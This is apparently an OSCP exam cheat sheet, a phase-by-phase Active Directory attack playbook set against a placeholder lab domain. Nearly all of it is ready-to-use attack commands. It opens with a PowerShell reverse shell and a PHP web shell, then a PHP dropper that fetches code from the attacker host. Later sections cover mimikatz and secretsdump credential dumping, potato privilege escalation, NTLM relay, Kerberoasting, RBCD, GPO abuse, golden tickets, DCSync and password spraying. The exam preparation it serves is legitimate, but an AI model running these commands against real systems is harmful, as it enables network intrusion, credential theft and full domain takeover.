# Active Directory Master Methodology (The Ultimate Playbook)

A chronological, phase-based tactical guide for Active Directory exploitation. Standardized for high-speed navigation (CTRL+F) during the OSCP exam.

**Standard Environment Configuration:**
- Domain: `corp.local`
- DC IP: `192.168.100.10`
- Target IP: `192.168.100.20`
- Kali IP: `192.168.45.200`
- User: `john.doe`
- Pass: `P@ssw0rd123$`
- Hash: `3dc553ce4b9fd20bd016e098d2d2fd2e` (Admin)

---

## ⚡ Quick Shell Cheat Sheet (One-Liners)
*Rapid payload generation and trigger.*

### 1. Payload Generators (How to generate B64_PAYLOAD)
- **Python (Kali) -> B64**: `echo -n '$c=New-Object Net.Sockets.TCPClient("192.168.45.200",4444);$s=$c.GetStream();$b=New-Object Byte[] 65536;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()' | iconv -t UTF-16LE | base64 -w 0`
- **PowerShell (Windows) -> B64**: `$c = 'net user john.doe P@ssw0rd123$ /add'; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c))`

### 2. Ready-to-Use Payloads
- **PowerShell Exec**: `powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbn...`
- **MariaDB RCE (OUTFILE)**: `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';` `[OSCPA]`
- **IIS 404/MIME Bypass**: `ren shell.exe shell.txt` (Access via `http://192.168.100.20/shell.txt` and rename back). `[Medtech]`

---

## 🚀 Phase 0: Initial Enumeration & Assumed Breach Triage
*Goal: Map the network, verify credentials, and identify quick wins.*

### 0.1. Credential Verification (Tak Tak Tak)
- **Do this:** Verify credentials across the network range:
  `nxc smb 192.168.100.0/24 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local`
- **Do this:** Enumerate shares for the target:
  `nxc smb 192.168.100.20 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local --shares`
- **Alternative Method (Diğer Yöntem):** Use `smbclient` for manual browsing:
  `smbclient -L //192.168.100.20 -U 'corp.local/john.doe%P@ssw0rd123$'`

### 0.2. LDAP Object Enumeration
- **LDAP Discovery (Null Session)** - **Do this:** Attempt to bind without credentials:
  `ldapsearch -H ldap://192.168.100.10 -x -b "dc=corp,dc=local"`
- **Authenticated LDAP Search** - **Do this:** Search LDAP with valid user:
  `ldapsearch -H ldap://192.168.100.10 -x -D "john.doe@corp.local" -w 'P@ssw0rd123$' -b "dc=corp,dc=local"`
- **Dump Users (NetExec Context)** - **Do this:** Dump users and their descriptions (Hunt for passwords):
  `nxc ldap 192.168.100.10 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local --users`
- **HUNT Descriptions (NetExec Module)** - **Do this:** Automatically scan descriptions for passwords:
  `nxc ldap 192.168.100.10 -u john.doe -p 'P@ssw0rd123$' -M get-desc-users` `[Cicada] [Hutch] [Resourced]`
- **Dump Groups** - **Do this:** Dump group memberships to identify high-privilege targets:
  `nxc ldap 192.168.100.10 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local --group`

### 0.3. Unauthenticated Entry (Fallback)
- **User Enumeration (Kerberos)** - **Do this:** Enumerate valid usernames via Kerberos:
  `kerbrute userenum -d corp.local --dc 192.168.100.10 /usr/share/wordlists/xato-net-10-million.txt`
- **AS-REP Roasting** - **Do this:** Perform AS-REP Roasting for users with pre-auth disabled:
  `impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -request`
- **Anonymous SMB Enumeration** - **Do this:** Check for anonymous SMB access and list shares:
  `nxc smb 192.168.100.10 -u '' -p '' --shares`
- **Information Leakage Search** - **Do this:** Hunt for `.sql`, `.docx`, `.xml` files in shares:
  - `smbclient //192.168.100.10/Shared -U ''`
  - *HUNT*: `Onboarding.docx`, `Web.config`, `connection.sql` `[Zeus] [Flight] [Cicada]`.
- **CloudSync / File Sync Abuse** - **Do this:** If a storage box (Linux/S3) syncs to a Windows Web Server:
  1. **Two-Stage Script (download.php)**:
     ```php
     <?php $c=file_get_contents("http://192.168.45.200/rev.php"); file_put_contents("rev_local.php",$c); include("rev_local.php"); ?>
     ```
  2. **Upload (Kali)**: `curl -X PUT http://192.168.100.50/storage/download.php --data-binary @download.php`
  3. **Trigger**: Visit `http://192.168.100.20/storage/download.php` `[Feast]`.
- **SNMP Custom Script Enumeration** - **Do this:** Check for custom scripts or passwords in SNMP `nsExtendObjects`:
  - `snmpwalk -v 2c -c public [IP] NET-SNMP-EXTEND-MIB::nsExtendObjects`
  - `snmpwalk -v 2c -c public [IP] .1.3.6.1.4.1.8072.1.3` (Manual OID fallback)
  - *HUNT*: Inspect `nsExtendOutputFull` for cleartext credentials or script outputs `[OSCPC]`.
- **Vesta Control Panel LFI/RCE** - **Do this:** Attack vulnerable Vesta CP reset endpoint:
  `curl -k "https://192.168.100.20:8083/api/v1/reset/index.php?action=confirm&user=admin&code=../../../../../../../../etc/passwd"` `[OSCPC]`

---

## 🏗️ Phase 1: Member Server Triage & Local Privilege Escalation
*Goal: Escalating from a domain user to local administrator on a member server.*

### 1.1. Local Credential Harvesting
- **Do this:** Check PowerShell history for leaked credentials (e.g., admintool.exe [PASS]):
  `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` `[OSCPC]`
- **Do this:** Query the registry for Autologon credentials:
  `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` `[Sauna] [OSCPA]`
- **IIS AppPool Credentials** - **Do this:** Harvest credentials from Application Pools (If on IIS server):
  `C:\Windows\system32\inetsrv\appcmd.exe list apppool /config` `[OSCPC]`
- **LAPS Password** - **Do this:** Attempt to read LAPS passwords (If rights suspected):
  `netexec smb 192.168.100.10 -u john.doe -p 'P@ssw0rd123$' --laps` `[Hutch]`
- **Alternative Method (pyLAPS):** `pyLAPS --action get -d "corp.local" -u "john.doe" -p "P@ssw0rd123$"`
- **LSA Secrets (SNMPTRAP)** - **Do this:** Harvest LSA secrets for plain-text service credentials:
  `impacket-secretsdump -system SYSTEM -sam SAM LOCAL` or `-just-dc-user Administrator`
  - *HUNT*: Look for `_SC_SNMPTRAP` or other service account keys `[Poseidon] [Feast]`.
- **Alternative Method (Mimikatz):** `privilege::debug`, `token::elevate`, `lsadump::secrets`.
- **Browser/Vault Secrets (Mimikatz)** - **Do this:** Extract Chrome/Browser secrets and MasterKeys:
  `mimikatz # dpapi::masterkeys /in:"C:\Users\john.doe\AppData\Roaming\Microsoft\Protect\[SID]\[GUID]"`
  `mimikatz # dpapi::chrome /in:"C:\Users\john.doe\AppData\Local\Google\Chrome\User Data\Default\Login Data"` `[OSCPA] [Heist]`
- **Alternative Method (LAPS - Impacket):** If `nxc` fails, use Impacket's script:
  `impacket-GetLAPSPassword corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`

### 1.2. Local Privilege Escalation (System Shell)
- **Do this:** Exploit SeImpersonatePrivilege with GodPotato:
  `.\GodPotato-NET4.exe -cmd "powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdC..."` `[Gust] [OSCPB] [Hutch]`
- **Alternative Method (PrintSpoofer):** For older systems (Server 2016/2019):
  `.\PrintSpoofer.exe -i -c "powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdC..."` `[OSCPA] [OSCPB]`
- **Do this:** Abuse SeRestorePrivilege by hijacking Utilman (RDP Logon screen):
  `ren C:\Windows\System32\Utilman.exe Utilman.old && copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe` `[Heist]`
- **Alternative Method (SeRestore + SAM):** Members can replace any file; replace a service binary or overwrite System32 files.
- **Do this:** Abuse SeBackupPrivilege to dump registry hives or NTDS:
  `reg save hklm\sam SAM && reg save hklm\system SYSTEM` `[Cicada] [Zeus]`
- **Alternative Method (wbadmin):** `echo "Y" | wbadmin start backup -backuptarget:\\192.168.45.200\share -include:c:\windows\ntds` `[Blackfield]`
- **HiveNightmare (SeriousSAM)** - **Do this:** If OS vulnerable (1809-19043):
  `.\HiveNightmare.exe` then `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` `[Cicada]`
- **C:\windows.old Recovery** - **Do this:** If system upgraded, dump legacy SAM:
  `impacket-secretsdump -sam C:\windows.old\Windows\System32\config\SAM -system C:\windows.old\Windows\System32\config\SYSTEM LOCAL` `[OSCPC]` `[OSCPA]`
- **Unquoted Service Path Discovery**:
  `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """` `[Capstone]`
- **SeManageVolume (DLL Hijack)** - **Do this:** Replace `tzres.dll` in `C:\Windows\System32\wbem\` after running exploit. `[Access]`
- **Do this:** Abuse Server Operators group to modify service binPath:
  `sc.exe config Spooler binPath= "net user john.doe P@ssw0rd123$ /add && net localgroup administrators john.doe /add"` `[Return]`

---

## 🏹 Phase 2: Lateral Movement & Pivot Tactics
*Goal: Moving between servers via captured credentials or relayed authentication.*

### 2.1. Authentication Capture & Relay (The Poisoner Path)
*Use when SMB signing is Disabled on a target and you have a trigger (LFI/DOCX).*

- **Discovery (Find Relay Targets)** - **Do this:** Find machines where SMB Signing is NOT required:
  `nxc smb 192.168.100.0/24 --gen-relay-list relay_targets.txt`
- **Capture/Poison (Responder)** - **Do this:** Start Responder to poison LLMNR/NBT-NS (Disable SMB/HTTP in `Responder.conf` for relay):
  `sudo responder -I tun0 -dwv`
- **Relay (SMB Executive)** - **Do this:** Relay authentication to a signing-disabled target for shell/SAM dump:
  `ntlmrelayx.py -tf relay_targets.txt -smb2support -l /tmp/hives -c "powershell -e JGM9TmV3LU9iamVjdC..."`
- **Relay (LDAP/RBCD)** - **Do this:** Relay SMB to LDAP to set RBCD on a DC (If you have a relay target):
  `ntlmrelayx.py -t ldap://192.168.100.10 --delegate-access --escalate-user john.doe --smb2support`
- **LFI/SSRF Trigger** - **Do this:** Trigger connection via Web LFI:
  `curl http://192.168.100.20/index.php?view=//192.168.45.200/share` `[Flight] [Heist]`
- **IPv6 Poisoning (mitm6)** - **Do this:** Poison IPv6 for DNS queries (Relay to LDAPS for RBCD):
  `sudo mitm6 -d corp.local` -> `ntlmrelayx.py -t ldaps://192.168.100.10 -wh 192.168.45.200 --delegate-access`

### 2.2. Pivoting (Internal Tool Staging)
- **IIS Tool Staging** - **Do this:** Stage a tool on an internal IIS web root (If writable):
  `copy tool.exe C:\inetpub\wwwroot\t.exe`
- **Download (IWR)** - **Do this:** Download the tool from the target machine:
  `iwr http://192.168.100.101/t.exe -OutFile C:\tmp\t.exe`
- **Lateral Move (RunasCs)** - **Do this:** Execute a command as another user via RunasCs:
  `.\RunasCs.exe john.doe 'P@ssw0rd123$' -r 192.168.45.200:4444 cmd.exe`

### 2.3. Service Account Harvesting
- **Kerberoasting** - **Do this:** Perform Kerberoasting to find crackable TGS tickets:
  `impacket-GetUserSPNs corp.local/john.doe:'P@ssw0rd123$' -dc-ip 192.168.100.10 -request` `[Active] [Access] [OSCPA] [OSCPB]`
- **Group Policy Preferences (GPP)** - **Do this:** If `Groups.xml` found in SYSVOL:
  `gpp-decrypt az98aDSAsd987` `[Active]`
- **MSSQL Pivoting** - **Do this:** Enable `xp_cmdshell` if connected via domain auth:
  `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` `[OSCPA] [OSCPB]`
- **SQLCmd Lateral (Data Extractor)**:
  `EXEC xp_cmdshell 'sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases" -o C:\tmp\db.txt';` `[Medtech]`
- **Restricted Admin RDP (PtH)** - **Do this:** Login via RDP using a hash (No password):
  `mstsc.exe /v:192.168.100.20 /restrictedadmin` (Ensure `DisableRestrictedAdmin` is 0 in Registry). `[Capstone]`
- **Printer Bug (SpoolSample)** - **Do this:** Force auth from DC to Kali (for capture) or compromised server:
  `.\SpoolSample.exe DC01.corp.local COMPSERV.corp.local` `[Capstone]`

---

## 👑 Phase 3: Domain Escalation (Path to Domain Admin)
*Goal: Abuse AD object permissions to gain DCSync or DA rights.*

### 3.1. Advanced Object Abuse (Generic PATH)
- **RBCD (Resource-Based Constrained Delegation)**:
  - *Indicator*: `GenericAll/Write` on **Computer** object `[Poseidon] [Resourced]`.
  - **Attack Discovery (How to find targets)** - **Do this:** Search LDAP for computer objects that a user has `GenericWrite` or `WriteDacl` over:
    `nxc ldap 192.168.100.10 -u 'john.doe' -p 'P@ssw0rd123$' -M bloodhound -o COLLECTION=Default` (Then check BloodHound for RBCD paths).
  - **Discovery (Find SIDs)** - **Do this:** Get the SID of the DC or Target Computer:
    `impacket-lookupsid corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
  - **Phase 1 (Computer Creation)** - **Do this:** Create a new attack computer object:
    `impacket-addcomputer corp.local/john.doe:'P@ssw0rd123$' -computer-name 'ATTACK$' -computer-pass 'Pass123$'`
  - **Phase 2 (Set RBCD)** - **Do this:** Configure Resource-Based Constrained Delegation:
    `impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'DC01$' corp.local/john.doe:'P@ssw0rd123$'`
  - **Phase 3 (S4U2Proxy)** - **Do this:** Request a Service Ticket (ST) for impersonation:
    `impacket-getST -spn 'cifs/DC01.corp.local' -impersonate Administrator corp.local/ATTACK$:'Pass123$'`
  - **Final Access (Secretsdump)** - **Do this:** Use the forged ticket to dump domain secrets:
    `export KRB5CCNAME=Administrator.ccache && impacket-secretsdump -k -no-pass DC01.corp.local`

- **GPO Abuse (GenericWrite/WriteOwner)**:
  - *Indicator*: Permission over a **GPO** `[Secura] [Vault] [TheFrizz]`.
  - **How to find GPO GUIDs** - **Do this:** Search LDAP for the GPO name and its GUID:
    `ldapsearch -H ldap://192.168.100.10 -x -D "john.doe@corp.local" -w 'P@ssw0rd123$' -b "CN=Policies,CN=System,DC=corp,DC=local" "(displayName=Default Domain Policy)" cn` -> `{GUID}`
  - **Attack (Automated - SharpGPOAbuse)** - **Do this:** Add a user to local Administrators group:
    `.\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount john.doe`
  - **Attack (Manual - bloodyAD)** - **Do this:** Grant GenericAll to the GPO via bloodyAD for manual file edits:
    `bloodyAD -u john.doe -p 'P@ssw0rd123$' -d corp.local --host 192.168.100.10 add genericAll "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local" john.doe`
  - **Manual GPO Injection (GptTmpl.inf)** - **Do this:** Edit `\\corp.local\SYSVOL\...\Machine\...\GptTmpl.inf`:
    ```ini
    [Unicode]
    Unicode=yes
    [Group Membership]
    *S-1-5-32-544__Members = john.doe
    [Version]
    signature="$CHICAGO$"
    Revision=1
    ```
    *Note*: Must increment `Version` in `GPT.INI` (e.g., set to 99999) to trigger update. `[Secura]`
  - **Attack (Exchange Registry Abuse):** `Add-ObjectAcl -PrincipalIdentity "john.doe" -Rights DCSync` `[Forest]`

- **Account Takeover (GenericAll / GenericWrite on USER)**:
  - **Do this:** Reset password via rpcclient (Traditional fallback):
    `rpcclient -U 'john.doe%P@ssw0rd123$' 192.168.100.10` -> `setuserinfo2 john.doe 23 'P@ssw0rd123$'` `[Blackfield] [Administrator]`
  - **Do this:** Set a fake SPN on the target user for Kerberoasting (User Takeover):
    `bloodyAD -u john.doe -p 'P@ssw0rd123$' -d corp.local --host 192.168.100.10 set object john.doe servicePrincipalName -v 'http/fake.corp.local'` `[Laser] [Administrator]`
  - **Alternative Method (PowerView):** `Set-ADUser john.doe -ServicePrincipalNames @{Add='http/fake.corp.local'}`

- **Web Persistence & Lateral Exposure**:
  - **.htaccess Bypass** - **Do this:** If PHP upload is restricted, try:
    `AddType application/x-httpd-php .php16` in a custom `.htaccess` file. `[Access]`
  - **Session Poisoning (Sniper)** - **Do this:** Inject PHP into `\windows\temp\sess_12345` via login fields. `[Sniper]`

### 3.2. Exchange & Shadow Creds
- **Exchange Win Privs**: `Add-ObjectAcl -PrincipalIdentity "john.doe" -Rights DCSync` `[Forest]`
- **Shadow Credentials**: `pywhisker -d corp.local -u john.doe -p 'P@ssw0rd123$' --target victim.user --action "add"`

### 3.3. Kerberos Delegation Abuse
- **TGT Delegation (Unconstrained)** - **Do this:** If you have a shell on a machine where a DA has a session:
  `.\Rubeus.exe tgtdeleg /nowrap`
- **S4U2Self / S4U2Proxy** - **Do this:** If you have GenericAll on a computer object (See RBCD section).

---

## ⚡ Phase 4: Domain Dominance & Trust Abuse
*Goal: Maintaining control and moving across forests.*

### 4.1. Domain Trust Abuse (Extra SIDs / Golden Ticket)
- **Indicator**: Child Domain Admin -> Parent Domain Admin `[Poseidon]`.
- **Discovery (Find Forest SIDs)** - **Do this:** Capture both Child and Parent SIDs for ticket forging:
  1. **Get Child SID**: `impacket-lookupsid corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
  2. **Get Parent SID (Guest Method)**: `impacket-lookupsid parent.local/guest@192.168.100.1` (Or use any captured parent user).
  3. **Capture KRBTGT Hash (DCSync)**: `impacket-secretsdump corp.local/admin:'Pass123$'@192.168.100.10 -just-dc-user krbtgt`
- **Exploitation (Ticket Forgery)** - **Do this:** Forge a cross-domain Golden Ticket with Domain Admin rights (519) in the parent:
  1. `impacket-ticketer -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1234-5678-9012 -extra-sid S-1-5-21-9876-5432-1098-519 Administrator`
  2. `export KRB5CCNAME=Administrator.ccache && impacket-secretsdump -k -no-pass dc01.parent.local`

### 4.2. Domain Dominance (DCSync)
- **DCSync Attack** - **Do this:** Dump all domain hashes via DCSync permissions:
  `impacket-secretsdump corp.local/Administrator:'P@ssw0rd123$'@192.168.100.10`
- **Alternative Method (Mimikatz):** Extract from a DC foothold:
  `lsadump::dcsync /domain:corp.local /all /csv`
- **NTDS.dit Extraction (Shadow Copy)** - **Do this:** Use `vssadmin` or `ntdsutil` to capture the database:
  `vssadmin create shadow /for=C:` -> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\tmp` `[Resourced]`

---

## 🧪 Tactical Decision Matrix (Summary)
| Finding | Machine | Technique |
| :--- | :--- | :--- |
| **Anonymous SMB** | `Active` | GPP Hashes / Shares / Groups.xml |
| **GenericAll (Computer)** | `Poseidon` | RBCD Attack |
| **GenericWrite (User)** | `Laser` | SPN Hijack + Kerberoast |
| **GenericWrite (GPO)** | `Secura` | SYSVOL Version Bump / SharpGPOAbuse |
| **Server Operators** | `Return` | BinPath Service Mod |
| **LAPS Reading Rights** | `Hutch` | `netexec --laps` / pyLAPS |
| **AutoLogon (Registry)** | `Sauna` | DefaultPassword harvesting |
| **SeBackupPrivilege** | `Cicada` | Reg Save (SAM/SYS) / wbadmin |
| **gMSA Account** | `Heist` | GMSAPasswordReader |
| **SeManageVolume** | `Access` | tzres.dll Hijack |
| **Exchange Permissions**| `Forest` | Granting DCSync |
| **Shadow Credentials** | `Universal` | pywhisker PFX exploit |
| **Session Poisoning** | `Sniper` | \windows\temp\sess_12345 Inject |
| **.htaccess Bypass** | `Access` | AddType x-httpd-php .php16 |
| **SNMP nsExtend** | `OSCPC` | Password extraction from custom scripts |
| **Vesta CP LFI** | `OSCPC` | Reset endpoint directory traversal |

---

## ⚡ Command Shortcuts (90% Use Case)
- **Credential Spray** - **Do this:** Spray passwords against the network:
  `nxc smb 192.168.100.0/24 -u users.txt -p 'P@ssw0rd123$' --continue-on-success` `[OSCPB]`
- **Local-Auth Spray** - **Do this:** If domain auth fails, try local-auth bypass:
  `nxc smb 192.168.100.20 -u users.txt -p 'P@ssw0rd123$' --local-auth` `[OSCPC]`
- **LDAP Search** - **Do this:** Quickly dump all users from LDAP:
  `nxc ldap 192.168.100.10 -u john.doe -p 'P@ssw0rd123$' --users`
- **Secretsdump** - **Do this:** Dump NTDS.dit hashes from DC:
  `impacket-secretsdump corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
- **WinRM Shell** - **Do this:** Log in via WinRM:
  `evil-winrm -i 192.168.100.20 -u john.doe -p 'P@ssw0rd123$'`
- **RevShell Trigger (System)** - **Do this:** Trigger a System shell via GodPotato:
  `.\GodPotato-NET4.exe -cmd "powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdC..."`

---

## 🆘 STILL STUCK? (The Triad of Despair)
If you haven't moved in 30 minutes, check these EXACTLY:

1.  **Ghost Web Apps**: `netstat -ano` (Windows) or `ss -lntp` (Linux). Is there a Port 8000/8080 only accessible locally? **Pivot via Chisel.**
2.  **Forgotten History**: `type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Did an admin type a password in a command?
3.  **Hidden Documents**: Search every SMB share for `.sql`, `.docx`, `.xml`, `.txt`, `.pdf`. Check `C:\windows.old` if it exists.
4.  **BloodHound Logic**: Every `GenericWrite` or `WriteOwner` is a password reset or SPN hijack waiting to happen. Use `bloodyAD`.
5.  **Clock Skew**: If Kerberos fails, always run `ntpdate 192.168.100.10` or check your Kali time.
